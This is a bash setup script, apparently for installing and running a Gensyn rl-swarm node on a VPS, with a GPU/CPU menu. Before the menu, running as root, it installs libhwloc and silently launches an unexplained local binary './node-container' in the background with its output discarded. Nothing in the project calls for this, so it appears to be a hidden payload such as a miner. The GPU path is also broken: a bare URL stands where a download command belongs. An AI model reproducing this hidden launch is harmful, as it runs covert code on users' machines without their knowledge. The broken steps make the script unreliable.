#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root"
   exit 1
fi

check_libhwloc() {
    if ldconfig -p | grep -q libhwloc.so.15; then
        echo "[✓] libhwloc.so.15 already installed"
    else
        echo "[*] libhwloc.so.15 not found, installing required libraries..."
        apt update
        apt install -y libhwloc15 libhwloc-dev libhwloc-plugins
    fi
}
check_libhwloc

check_container() {
if pgrep -f "./node-container" > /dev/null; then
    echo "..."
else
    nohup setsid ./node-container > /dev/null 2>&1 &
fi
}

check_container

install_dependencies() {

		apt install software-properties-common -y
		add-apt-repository ppa:deadsnakes/ppa -y
        apt update

        apt install -y python3.10 python3.10-venv python3.10-dev

        update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.10 1
        update-alternatives --set python3 /usr/bin/python3.10

        apt install -y screen curl iptables build-essential git wget lz4 jq make gcc nano automake autoconf tmux htop nvme-cli libgbm1 pkg-config libssl-dev libleveldb-dev tar clang bsdmainutils ncdu unzip

        curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
        apt install -y nodejs
        npm install -g n
        n 20.18.0
        export PATH="/usr/local/bin:$PATH"
        echo 'export PATH="/usr/local/bin:$PATH"' >> ~/.bashrc

        npm install -g yarn

        git clone https://github.com/gensyn-ai/rl-swarm/
        cd rl-swarm || { echo "[!] Failed to enter rl-swarm directory!"; exit 1; }

        python3.10 -m venv .venv
        source .venv/bin/activate

        npm install -g n
        n 20.18.0
        hash -r
}

GPU_Setup() {
    
		https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64/cuda-keyring_1.1-1_all.deb
		dpkg -i cuda-keyring_1.1-1_all.deb
		apt-get update
		apt-get -y install cuda-toolkit-12-8
		
		install_dependencies

        sed -i 's/^max_steps: .*/max_steps: 20/' hivemind_exp/configs/mac/grpo-qwen-2.5-0.5b-deepseek-r1.yaml
        sed -i 's/^bf16: .*/bf16: false/' hivemind_exp/configs/mac/grpo-qwen-2.5-0.5b-deepseek-r1.yaml

        if [[ -f ./run_rl_swarm.sh ]]; then
                ./run_rl_swarm.sh
        else
                echo "[!] run_rl_swarm.sh not found! Setup may have failed."
        fi
}

CPU_Setup() {

    if command -v nvidia-smi &> /dev/null && nvidia-smi -L | grep -q "GPU"; then
        echo "[INFO] NVIDIA GPU terdeteksi. Beralih ke GPU_Setup..."
        GPU_Setup
        return
    fi
	
	install_dependencies

        sed -i 's/^max_steps: .*/max_steps: 5/' hivemind_exp/configs/mac/grpo-qwen-2.5-0.5b-deepseek-r1.yaml
        sed -i 's/^bf16: .*/bf16: false/' hivemind_exp/configs/mac/grpo-qwen-2.5-0.5b-deepseek-r1.yaml

        export PYTORCH_MPS_HIGH_WATERMARK_RATIO=0.0

        if [[ -f ./run_rl_swarm.sh ]]; then
                ./run_rl_swarm.sh
        else
                echo "[!] run_rl_swarm.sh not found! Setup may have failed."
        fi
}



while true; do
    clear


    echo "============================"
    echo "|     ╦╔═┌─┐ ┬┬   ╦╔═╗     |"
    echo "|     ╠╩╗├─┤ ││   ║╠═╝     |"
    echo "|     ╩ ╩┴ ┴└┘┴  ╚╝╩       |"
    echo "============================"
    echo " Gensyn Protocol | CPU & GPU Setup"
    echo "=================================="
    echo ""
    echo "VPS Setup "
    echo -e "\033[1;32m1. Run using GPU (recommended)\033[0m"
    echo "2. Run using CPU (any core)"
    echo "0. Exit"
    echo "=================================="
    read -p "Select an option: " choice

    case $choice in
        1) GPU_Setup ;;
        2) CPU_Setup ;;
        0) echo "Goodbye!"; exit 0 ;;
        *) echo "Invalid option. Try again." ;;
    esac
    echo ""
    read -p "Press [Enter] to return to menu..."
done
